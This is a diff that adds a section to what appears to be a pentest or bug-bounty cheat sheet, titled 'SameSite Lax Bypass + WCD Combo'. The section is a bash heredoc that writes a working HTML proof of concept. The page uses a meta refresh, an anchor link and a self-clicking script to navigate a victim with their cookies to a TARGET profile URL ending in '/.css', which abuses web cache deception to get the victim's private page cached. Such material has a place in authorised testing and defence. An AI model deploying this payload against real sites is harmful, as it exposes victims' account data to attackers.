@@ -248,6 +248,34 @@ True-Client-IP
 
 ---
 
+---
+
+## SameSite Lax Bypass + WCD Combo
+
+```bash
+# If the target uses SameSite=Lax cookies, WCD alone won't work because
+# cookies aren't sent on cross-site requests. But SameSite=Lax sends
+# cookies on TOP-LEVEL NAVIGATION (meta refresh, anchor click, form GET).
+
+# Combo payload:
+cat > wcd_samesite_poc.html << 'HTMLEOF'
+<html>
+<head>
+  <!-- Victim visits this page, auto-redirects to WCD URL with cookies -->
+  <meta http-equiv="refresh" content="0; url=https://TARGET/profile.php/.css">
+</head>
+<body>
+  <p>Redirecting...</p>
+  <!-- Backup: anchor tag if meta refresh fails -->
+  <a id="fallback" href="https://TARGET/profile.php/.css">Click here</a>
+  <script>document.getElementById('fallback').click();</script>
+</body>
+</html>
+HTMLEOF
+
+echo "[+] WCD + SameSite bypass PoC saved to wcd_samesite_poc.html"
+```
+
 ## Gate 0 Validation
 
 1. **What can the attacker DO right now?**
